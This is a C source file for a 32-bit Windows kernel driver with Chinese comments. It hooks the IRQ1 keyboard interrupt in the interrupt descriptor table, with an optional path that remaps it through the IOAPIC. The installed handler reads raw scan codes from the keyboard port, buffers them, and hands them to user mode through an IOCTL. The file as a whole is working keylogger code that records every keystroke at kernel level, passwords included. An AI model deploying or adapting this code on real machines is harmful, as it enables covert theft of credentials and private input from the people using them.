#include <ntddk.h>
#include <windef.h>
#include <stdlib.h>
#include <my_driver.h>

#define	DEVICE_NAME			L"\\Device\\keyboard"
#define LINK_NAME			L"\\DosDevices\\keyboard"

#define IOCTL_SAY_HELLO	     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_CONTENT      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

int HOOKIDT();
void UNHOOKIDT();
VOID MyPortFilter();
VOID MyInterruptProc();
void content_delete();
void content_push(P2C_U8);
P2C_U8 p2cSeachOrSetIrq1(P2C_U8);
P2C_U8 p2cCopyANewIdt(P2C_U8 , void * );
void p2cResetIoApic(BOOLEAN );
P2C_U8 p2cGetIdleIdtVec();
P2C_U8 search_for_irq1_idtnum();

P2C_U8 sch_pre = 0;
P2C_U8 sch_pre_pre = 0;
P2C_U8 IRQ1_IDTNUM = 0;
KSPIN_LOCK SpinLock_keyboard;
KSPIN_LOCK SpinLock_content;
UCHAR KbBuff[128] = { 0 };
ULONG CurPos = 0;


void *Origin_address; //HOOK IRQ1_IDTNUM 时保留的原始地址
PVOID buffer; //总体缓冲区
size_t buffer_use_count = 0;
//这一函数不需要修改，为缺省的驱动卸载函数
VOID DriverUnload(PDRIVER_OBJECT pDriverObj)
{
	UNICODE_STRING strLink;
	DbgPrint("[KeyBoard]DriverUnload\n");
	RtlInitUnicodeString(&strLink, LINK_NAME);
	IoDeleteSymbolicLink(&strLink);
	IoDeleteDevice(pDriverObj->DeviceObject);
	UNHOOKIDT();
	//p2cResetIoApic(FALSE);
}

//这一函数不需要修改，为缺省的驱动安装函数
NTSTATUS DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	DbgPrint("[KeyBoard]DispatchCreate\n");
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

//这一函数不需要修改，为缺省的驱动退出函数
NTSTATUS DispatchClose(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	DbgPrint("[KeyBoard]DispatchClose\n");
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

//IRP_MJ_DEVICE_CONTROL对应的处理例程，驱动最重要的函数之一，一般走正常途径调用驱动功能的程序，都会经过这个函数
NTSTATUS DispatchIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION pIrpStack;
	ULONG uIoControlCode;
	PVOID pIoBuffer;
	ULONG uInSize;
	ULONG uOutSize;
	KIRQL CurIrql, OldIrql;
	DbgPrint("[KeyBoard]DispatchIoctl\n");
	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	uIoControlCode = pIrpStack->Parameters.DeviceIoControl.IoControlCode;
	pIoBuffer = pIrp->AssociatedIrp.SystemBuffer;
	uInSize = pIrpStack->Parameters.DeviceIoControl.InputBufferLength;
	uOutSize = pIrpStack->Parameters.DeviceIoControl.OutputBufferLength;
	switch (uIoControlCode)
	{
	case IOCTL_GET_CONTENT:
	{
		KeAcquireSpinLock(&SpinLock_content, &OldIrql);
		memcpy(pIoBuffer, buffer, 255);
		KeReleaseSpinLock(&SpinLock_content, OldIrql);
		content_delete();
		DbgPrint("[KeyBoard]May be I have done something\n");
		status = STATUS_SUCCESS;
		break;
	}
	case IOCTL_SAY_HELLO:
	{
		DbgPrint("[KeyBoard]IOCTL_SAY_HELLO\n");
		status = STATUS_SUCCESS;
		break;
	}
	}
	if (status == STATUS_SUCCESS)
		pIrp->IoStatus.Information = uOutSize;
	else
		pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = status;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryString) {
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING ustrLinkName;
	UNICODE_STRING ustrDevName;
	PDEVICE_OBJECT pDevObj;
	pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
	pDriverObj->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
	pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
	pDriverObj->DriverUnload = DriverUnload;

	//分配全局缓冲区
	buffer = ExAllocatePool(PagedPool,0x100);

	RtlInitUnicodeString(&ustrDevName, DEVICE_NAME);
	status = IoCreateDevice(pDriverObj, 0, &ustrDevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDevObj);
	if (!NT_SUCCESS(status))	return status;

	RtlInitUnicodeString(&ustrLinkName, LINK_NAME);
	status = IoCreateSymbolicLink(&ustrLinkName, &ustrDevName);
	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(pDevObj);
		return status;
	}
	DbgPrint("[KeyBoard]DriverEntry\n");
	DbgPrint("[KeyBoard]Prepare for Hook or IOAPIC\n");
	IRQ1_IDTNUM = search_for_irq1_idtnum();
	DbgPrint("[KeyBoard]We have found that Your IRQ1's IDT num is 0x%2x\n", IRQ1_IDTNUM);

	if (IRQ1_IDTNUM == NULL) {
		DbgPrint("[KeyBoard]Bad IDT number,driver will exit\n");
		return STATUS_SUCCESS;
	}

	//p2cResetIoApic(TRUE);
	HOOKIDT();

	return STATUS_SUCCESS;
}


int HOOKIDT() {
	P2C_IDTR idtr;
	_asm sidt idtr
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)(void *)idtr.base;
	idt_addr += IRQ1_IDTNUM;
	void * fake = NULL;
	KdPrint(("IDT:%x\n",idt_addr));
	DbgPrint("[KeyBoard]start to HOOK INT 0x%2x , now address: %x\n",IRQ1_IDTNUM ,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high) );
	Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);
	idt_addr->offset_low = P2C_LOW16_OF_32(MyInterruptProc);
	idt_addr->offset_high = P2C_HIGH16_OF_32(MyInterruptProc);
	DbgPrint("[KeyBoard]HOOK INT 0x%2x End, now address: %x\n", IRQ1_IDTNUM,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high));
}

void UNHOOKIDT() {
	P2C_IDTR idtr;
	_asm sidt idtr
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)idtr.base;
	if (Origin_address == NULL) {
		DbgPrint("[KeyBoard]无效的地址，无法恢复INT 0x%2x处的中断\n",IRQ1_IDTNUM);
		return;
	}

	idt_addr += IRQ1_IDTNUM;
	DbgPrint("[KeyBoard]start to HOOK INT 0x%2x , now address: %x\n", IRQ1_IDTNUM,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high));
	idt_addr->offset_low = P2C_LOW16_OF_32(Origin_address);
	idt_addr->offset_high = P2C_HIGH16_OF_32(Origin_address);

	DbgPrint("[KeyBoard]HOOK INT 0x%2x End, now address: %x\n",IRQ1_IDTNUM ,(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high));
}


__declspec(naked) VOID MyInterruptProc()
{
	__asm
	{
		pushad								// 保存所有的通用寄存器
		pushfd								// 保存标志寄存器
		push fs
		mov bx, 0x30
		mov fs, bx							//fs段寄存器在内核态值固定为0x30
		push ds
		push es
	
		call MyPortFilter

		pop es
		pop ds
		pop fs
		popfd								// 恢复标志寄存器
		popad								// 恢复通用寄存器
		jmp Origin_address					// 跳到原来的中断服务程序
	}
}

//键盘上按键发生之后，cpu会将信息发送到0x60端口，但是在读之前，必须测试端口是否可读
//针对8042键盘
ULONG p2cWaitForKbRead()
{
	int i = 100;
	P2C_U8 mychar;
	do
	{
		_asm in al, 0x64
		_asm mov mychar, al
		KeStallExecutionProcessor(50);//使CPU暂停特定的微妙，使键盘有时间去处理一些工作
		if (!(mychar & OBUFFER_FULL)) break;//获得寄存器内容，根据标志位判断读是否就绪
	} while (i--);
	if (i) return TRUE;  //如果总是判断不成功，那么认为是虚假的按键，否则是真实的按键
	return FALSE;
}

//同样的，等待端口可写
ULONG p2cWaitForKbWrite()
{
	int i = 100;
	P2C_U8 mychar;
	do
	{
		_asm in al, 0x64
		_asm mov mychar, al
		KeStallExecutionProcessor(50);
		if (!(mychar & IBUFFER_FULL)) break; //写就绪判断的标志位不同是0x00000001
	} while (i--);
	if (i) return TRUE;
	return FALSE;
}

BOOLEAN FLAG_OXE0 = FALSE;

VOID MyPortFilter() {
	//static P2C_U8 sch_pre = 0;
	P2C_U8	sch;
	KIRQL CurIrql, OldIrql;
	CurIrql = KeGetCurrentIrql();
	p2cWaitForKbRead();
	//直接读0x60端口的扫描码
	sch = READ_PORT_UCHAR((PUCHAR)0x60);
	//判断是否是扩展字符或者当前是否是扩展状态
	if (sch != 0xE0 && FLAG_OXE0 == FALSE) {
		if (sch_pre != sch)
		{
			//为解决重复中断的问题而设立
			//向0x60端口写时会再次遭遇中断
			sch_pre = sch;
			p2cWaitForKbWrite();
			//向CPU发出写端口命令
			_asm mov al, 0xd2
			_asm out 0x64, al
			p2cWaitForKbWrite();
			//写端口
			_asm mov al, sch
			_asm out 0x60, al
			//保存到共享空间
			content_push(sch);
			KdPrint(("p2c: scan code = %2x\r\n",sch));
		}
	}
	else if (sch == 0xE0) {  //扩展字符
		FLAG_OXE0 = TRUE;
		KdPrint(("p2c: find a 0xE0 flag!\r\n"));
		content_push(sch);
	}
	else if (FLAG_OXE0 == TRUE) { //下一次访问
		FLAG_OXE0 = FALSE;
		KdPrint(("p2c: find a 0xE0 code = %2x!\r\n", sch));
		content_push(sch);
	}
}

void content_push(P2C_U8 sch){
	P2C_U8 * content = (P2C_U8 *)buffer;
	static int maxcount = 0XFF;
	KIRQL CurIrql, OldIrql;
	if (buffer_use_count < maxcount) {
		KeAcquireSpinLock(&SpinLock_content, &OldIrql);
		content[buffer_use_count] = sch;
		buffer_use_count++;
		KeReleaseSpinLock(&SpinLock_content, OldIrql);
	}
}

void content_delete() {
	P2C_U8 * content = (P2C_U8 *)buffer;
	KIRQL CurIrql, OldIrql;
	KeAcquireSpinLock(&SpinLock_content, &OldIrql);
	buffer_use_count = 0; //计数为0则代表删除
	memset(content,0,255);
	KeReleaseSpinLock(&SpinLock_content, OldIrql);
}

//搜索IRQ1的中断
P2C_U8 p2cSeachOrSetIrq1(P2C_U8 new_ch)
{
	// 选择寄存器。选择寄存器虽然是32位的寄存器，但是只使用
	// 低8位，其他的位都被保留。
	P2C_U8 *io_reg_sel;

	// 窗口寄存器，用来读写被选择寄存器选择的值，是32位的。
	P2C_U32 *io_win;
	P2C_U32 ch, ch1;

	// 定义一个物理地址，这个地址为0xfec00000。正是IOAPIC--中断分发
	// 寄存器组在Windows上的开始地址
	PHYSICAL_ADDRESS	phys;
	PVOID paddr;
	RtlZeroMemory(&phys, sizeof(PHYSICAL_ADDRESS));
	phys.u.LowPart = 0xfec00000;

	// 物理地址是不能直接读写的。MmMapIoSpace把物理地址映射
	// 为系统空间的虚拟地址。0x14是这片空间的长度。
	paddr = MmMapIoSpace(phys, 0x14, MmNonCached);

	// 如果映射失败了就返回0.
	if (!MmIsAddressValid(paddr))
		return 0;

	// 选择寄存器的偏移为0
	io_reg_sel = (P2C_U8 *)paddr;
	// 窗口寄存器的偏移为0x10.
	io_win = (P2C_U32 *)((P2C_U8 *)(paddr)+0x10);

	// 选择第0x12，刚好是irq1的项
	*io_reg_sel = 0x12;
	ch = *io_win;

	// 如果new_ch不为0，我们就设置新值。并返回旧值。
	// 设置新的中断号
	if (new_ch != 0)
	{
		ch1 = *io_win;
		ch1 &= 0xffffff00;
		ch1 |= (P2C_U32)new_ch;
		*io_win = ch1;
		KdPrint(("p2cSeachOrSetIrq1: set %2x to irq1.\r\n", (P2C_U8)new_ch));
	}

	// 窗口寄存器里读出的值是32位的，但是我们只需要
	// 一个字节就可以了。这个字节就是中断向量的值。
	// 一会我们要修改这个值。
	ch &= 0xff;
	MmUnmapIoSpace(paddr, 0x14);
	KdPrint(("p2cSeachOrSetIrq1: the old vec of irq1 is %2x.\r\n", (P2C_U8)ch));
	return (P2C_U8)ch;
}

P2C_U8 p2cGetIdleIdtVec()
{
	P2C_U8 i;
	PP2C_IDTENTRY idt_addr;
	P2C_IDTR idtr;
	_asm sidt idtr
	idt_addr = (PP2C_IDTENTRY)idtr.base;

	// 从20搜索到4a
	for (i = 0x20; i<0x4a; i++)
	{
		// 如果类型为0说明是空闲位置，返回
		if (idt_addr[i].type == 0)
		{
			return i;
		}
	}
	return 0;
}

P2C_U8 p2cCopyANewIdt(P2C_U8 id, void *interrupt_proc)
{
	// 我们写入一个新的中断门。这个门完全拷贝原来的
	// 的idtentry，只是中断处理函数的地址不同。
	PP2C_IDTENTRY idt_addr;
	P2C_IDTR idtr;
	_asm sidt idtr
	idt_addr = (PP2C_IDTENTRY)idtr.base;
	idt_addr[id] = idt_addr[IRQ1_IDTNUM]; //除了中断处理函数之外，完全拷贝IRQ1_IDTNUM的中断，这是我们设置的假门
	idt_addr[id].offset_low = P2C_LOW16_OF_32(interrupt_proc);
	idt_addr[id].offset_high = P2C_HIGH16_OF_32(interrupt_proc);
	return id;
}

void p2cResetIoApic(BOOLEAN set_or_recovery)
{
	static P2C_U8 idle_id = 0;
	PP2C_IDTENTRY idt_addr;
	P2C_IDTR idtr;
	_asm sidt idtr
	idt_addr = (PP2C_IDTENTRY)idtr.base;
	P2C_U8 old_id = 0;

	if (set_or_recovery)
	{
		// 原函数的入口。
		P2C_IDTR idtr;
		_asm sidt idtr
		idt_addr = (PP2C_IDTENTRY)idtr.base;
		idt_addr += IRQ1_IDTNUM;
		Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);

		// 然后获得一个空闲位，将irq1处理中断门复制一个进去。
		// 里面的跳转函数填写为我们的新的处理函数。
		idle_id = p2cGetIdleIdtVec();
		if (idle_id != 0)
		{
			p2cCopyANewIdt(idle_id, MyInterruptProc);
			// 然后重新定位到这个中断。
			old_id = p2cSeachOrSetIrq1(idle_id);

			//判断原始的中断是不是IRQ1_IDTNUM，如果不是，可能恢复会出问题
			ASSERT(old_id == IRQ1_IDTNUM);
		}
	}
	else
	{
		// 如果是要恢复
		old_id = p2cSeachOrSetIrq1(IRQ1_IDTNUM);
		//判断是否把正确的IDT变回来了
		ASSERT(old_id == idle_id);
		// 现在那个中断门没用了，设置type = 0使之空闲
		idt_addr[old_id].type = 0;
	}
}

//搜索当前主机环境下irq1对应的idt序号
P2C_U8 search_for_irq1_idtnum() {
	P2C_U8 *io_reg_sel;
	P2C_U32 *io_win;
	P2C_U32 ch, ch1;
	PHYSICAL_ADDRESS	phys;
	PVOID paddr;
	RtlZeroMemory(&phys, sizeof(PHYSICAL_ADDRESS));
	phys.u.LowPart = 0xfec00000;
	paddr = MmMapIoSpace(phys, 0x14, MmNonCached);
	if (!MmIsAddressValid(paddr))
		return 0;
	io_reg_sel = (P2C_U8 *)paddr;
	io_win = (P2C_U32 *)((P2C_U8 *)(paddr)+0x10);
	*io_reg_sel = 0x12;
	ch = *io_win;
	return (P2C_U8)ch;
}